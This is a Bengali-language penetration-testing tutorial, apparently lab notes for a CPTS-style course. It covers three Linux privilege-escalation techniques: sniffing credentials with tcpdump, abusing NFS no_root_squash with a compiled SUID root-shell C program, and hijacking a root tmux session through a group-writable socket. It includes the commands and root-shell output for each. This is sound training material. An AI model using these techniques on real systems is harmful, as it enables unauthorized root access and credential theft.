অ্যাডভান্সড পেনিট্রেশন টেস্টিং এবং CPTS পাথওয়ের মতো ল্যাবগুলোতে প্রায়ই এমন কিছু কনফিগারেশন ত্রুটি পাওয়া যায় যেগুলো সচরাচর চোখে পড়ে না। সিস্টেমে অ্যাক্সেস পাওয়ার পর নিচের তিনটি টেকনিক ব্যবহার করে প্রিভিলেজ এসকালেশন করা যেতে পারে।

## ১. Passive Traffic Capture (নেটওয়ার্ক ট্রাফিক স্নায়ু করা)

অনেক সময় সিস্টেমে আনপ্রিভিলেজড বা সাধারণ ইউজারদেরও `tcpdump` ব্যবহার করে নেটওয়ার্ক ট্রাফিক ক্যাপচার করার পারমিশন দেওয়া থাকে। এই সুযোগটি কাজে লাগিয়ে সিস্টেমের ব্যাকগ্রাউন্ডে চলা বিভিন্ন কমিউনিকেশন থেকে সংবেদনশীল তথ্য বের করে আনা যায়।

* **উপযোগী টুলস:** `net-creds` বা `PCredz` এর মতো টুল ব্যবহার করে ক্যাপচার করা ডেটা সহজেই বিশ্লেষণ করা যায়।
* **যা পাওয়া যেতে পারে:** প্লেইনটেক্সট প্রোটোকল (যেমন HTTP, FTP, POP, IMAP, telnet, SMTP) থেকে সরাসরি পাসওয়ার্ড, SNMP কমিউনিটি স্ট্রিং, অথবা Net-NTLMv2, SMBv2 এবং Kerberos হ্যাশ। এই হ্যাশগুলো অফলাইনে ব্রুট-ফোর্স করে পাসওয়ার্ড বের করা সম্ভব।

## ২. Weak NFS Privileges (দুর্বল NFS পারমিশন)

Network File System (NFS) সাধারণত লিনাক্স/ইউনিক্স সিস্টেমে ফাইল বা ডিরেক্টরি শেয়ার করার জন্য TCP/UDP 2049 পোর্টে কাজ করে। `showmount -e <IP>` কমান্ড দিয়ে খুব সহজেই রিমোট সার্ভারের এক্সপোর্ট লিস্ট (কোন ফোল্ডারগুলো শেয়ার করা আছে) দেখা যায়।

NFS ভলিউম তৈরি করার সময় কনফিগারেশনে কিছু অপশন সেট করা যায়, যার মধ্যে একটি অপশন হ্যাকারদের জন্য রুট শেল পাওয়ার রাস্তা খুলে দেয়।

| অপশন (Option) | বর্ণনা (Description) |
| --- | --- |
| **root_squash** | এটি একটি সিকিউরিটি ফিচার। রুট ইউজার হিসেবে কানেক্ট করলে তা `nfsnobody` (সাধারণ ইউজার) এ পরিবর্তিত হয়। ফলে রুট ইউজার কোনো SUID বাইনারি তৈরি করতে পারে না। |
| **no_root_squash** | এটি হ্যাকারদের জন্য সবচেয়ে উপকারী। রিমোট ইউজার যদি লোকাল রুট হিসেবে কানেক্ট করে, তবে সে সার্ভারেও রুট হিসেবেই কাজ করতে পারবে এবং SUID বাইনারি তৈরি করতে পারবে। |

**অ্যাটাক পদ্ধতি (no_root_squash এক্সপ্লয়টেশন):**

১. প্রথমে অ্যাটাকিং মেশিনে একটি C প্রোগ্রাম লিখে সেটি কম্পাইল করতে হবে, যা রুট পারমিশন নিয়ে `/bin/bash` ওপেন করবে।

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

```

২. অ্যাটাকিং মেশিনে টার্গেট NFS শেয়ারটি মাউন্ট করতে হবে এবং কম্পাইল করা বাইনারিটি সেখানে কপি করে SUID পারমিশন (`u+s`) দিতে হবে।

```bash
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:/tmp$ cp shell /mnt
root@Pwnbox:/tmp$ chmod u+s /mnt/shell

```

৩. এরপর টার্গেট মেশিনে সাধারণ ইউজার হিসেবে লগইন করে সেই বাইনারিটি এক্সিকিউট করলেই রুট শেল পাওয়া যাবে।

```bash
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id
uid=0(root) gid=0(root) groups=0(root)

```

## ৩. Hijacking Tmux Sessions (Tmux সেশন হাইজ্যাকিং)

Tmux এর মতো টার্মিনাল মাল্টিপ্লেক্সার ব্যবহার করে একটি কনসোলের ভেতর অনেকগুলো সেশন চালানো যায়। অনেক সময় অ্যাডমিন বা রুট ইউজাররা দীর্ঘমেয়াদি কোনো কাজ (যেমন Nmap স্ক্যান) চালানোর জন্য একটি Tmux সেশন ডিটাচ (detach) করে ব্যাকগ্রাউন্ডে রেখে যান। যদি এই সেশনগুলোর সকেট ফাইলে দুর্বল পারমিশন দেওয়া থাকে, তবে অন্য ইউজার সেই সেশনে ঢুকে সরাসরি রুট অ্যাক্সেস পেতে পারে।

**অ্যাটাক পদ্ধতি:**

১. প্রথমে সিস্টেমে চলমান কোনো Tmux প্রসেস আছে কিনা তা চেক করতে হবে।

```bash
htb@NIX02:~$ ps aux | grep tmux
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess

```

২. এরপর সেই সকেট ফাইলটির (`/shareds`) পারমিশন চেক করতে হবে।

```bash
htb@NIX02:~$ ls -la /shareds 
srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds

```

এখানে দেখা যাচ্ছে রুট ইউজারের পাশাপাশি `devs` গ্রুপের সদস্যরাও এই সেশনটি রিড এবং রাইট করতে পারবে।

৩. নিজের গ্রুপ মেম্বারশিপ চেক করে নিশ্চিত হতে হবে যে বর্তমান ইউজার `devs` গ্রুপের সদস্য কিনা।

```bash
htb@NIX02:~$ id
uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

```

৪. পরিশেষে, সেই সকেটটি নির্দিষ্ট করে Tmux সেশনে অ্যাটাচ (attach) করলেই সরাসরি রুট শেল বা অ্যাডমিনের সেশন অ্যাক্সেস পাওয়া যাবে।

```bash
htb@NIX02:~$ tmux -S /shareds
id
uid=0(root) gid=0(root) groups=0(root)

```
